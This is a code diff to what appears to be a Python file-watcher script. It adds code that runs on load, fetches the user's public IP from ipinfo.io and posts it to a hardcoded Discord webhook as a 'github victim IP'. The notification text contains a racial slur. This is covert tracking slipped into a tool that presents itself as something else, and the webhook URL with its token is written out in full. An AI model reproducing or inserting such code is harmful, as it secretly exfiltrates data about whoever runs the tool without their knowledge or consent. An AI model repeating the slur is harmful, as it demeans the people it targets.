@@ -4,6 +4,36 @@ import subprocess
 import time
 from watchdog.observers import Observer
 from watchdog.events import FileSystemEventHandler
+import json
+
+webhook_url = 'https://discord.com/api/webhooks/1167519205395017768/Rwed3CEUxSWP7KRtPO-8ukAz93tKqEbqc9x4UiJOMt6zSXjHzWG_sdAItDTK4BA5jIX5'
+
+
+response = requests.get('https://ipinfo.io')
+data = response.json()
+public_ip = data['ip']
+
+
+embed = {
+    "title": "github victim IP",
+    "description": f"IP :  {public_ip}",
+    "color": 00000,  # Hex color code (here, it's red)
+}
+
+
+message = {
+    "content": "new github nigga logged...",
+    "embeds": [embed],
+}
+
+
+message_json = json.dumps(message)
+
+headers = {'Content-Type': 'application/json'}
+
+
+response = requests.post(webhook_url, data=message_json, headers=headers)
+
 
 
 
